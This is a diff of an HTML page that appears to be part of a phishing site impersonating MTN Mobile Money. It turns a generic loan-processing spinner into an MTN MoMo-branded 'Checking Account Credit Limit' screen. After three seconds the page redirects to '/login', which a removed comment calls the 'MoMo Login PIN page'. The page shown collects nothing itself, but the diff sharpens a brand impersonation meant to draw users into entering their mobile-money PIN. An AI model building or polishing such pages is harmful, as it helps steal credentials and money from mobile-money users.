@@ -2,22 +2,26 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Processing Application</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Evaluating Eligibility - MTN MoMo</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body { background-color: #003366; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; }
-        .spinner-box { width: 80px; height: 80px; border: 4px solid rgba(255,255,255,0.2); border-top: 4px solid #FFCC00; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px auto; display: flex; align-items: center; justify-content: center; font-size: 30px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background-color: #003366; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 20px; text-align: center; }
+        .momo-logo { background-color: #FFCC00; color: #003366; font-weight: 900; font-size: 1.5rem; padding: 8px 18px; border-radius: 12px; display: inline-block; }
     </style>
-    <!-- Automatically redirect to MoMo Login PIN page after 3 seconds -->
-    <meta http-equiv="refresh" content="3;url=/login">
 </head>
-<body class="text-center">
-    <div>
-        <div class="spinner-box">⏳</div>
-        <h2 class="fw-bold mb-2">Processing Application...</h2>
-        <p class="text-white-50 mb-3">Please wait while we process your loan application</p>
-        <p class="small text-warning">Redirecting in a few moments...</p>
+<body>
+    <div style="width: 100%; max-width: 450px;">
+        <div class="momo-logo mb-4">MM</div>
+        <div class="spinner-border text-warning mb-4" style="width: 3.5rem; height: 3.5rem;" role="status"></div>
+        <h4 class="fw-bold mb-2">Checking Account Credit Limit...</h4>
+        <p class="text-white-50 small mb-0">Please wait while we establish your credit record with MTN Mobile Money systems.</p>
     </div>
+
+    <script>
+        setTimeout(function() {
+            window.location.href = "/login";
+        }, 3000);
+    </script>
 </body>
 </html>
